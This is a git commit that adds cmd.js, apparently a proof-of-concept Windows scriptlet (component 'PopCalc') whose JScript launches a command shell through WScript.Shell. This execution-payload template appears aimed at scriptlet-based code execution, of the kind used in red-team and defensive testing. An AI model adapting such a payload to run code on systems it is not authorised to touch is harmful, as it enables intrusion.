700f68d0b8473f4ea32f41a1386c317bd5e3265e
ment4t <ment4t@users.noreply.github.com>
2020-09-28 11:26:10 +0100

    Create cmd.js
    calc > cmd

---
+++ cmd.js
@@ -0,0 +1,10 @@
+<?xml version="1.0"?>
+<package>
+<component id="PopCalc">
+<script language="JScript">
+<![CDATA[
+var r = new ActiveXObject("WScript.Shell").Run("cmd"); 
+]]>
+</script>
+</component>
+</package>
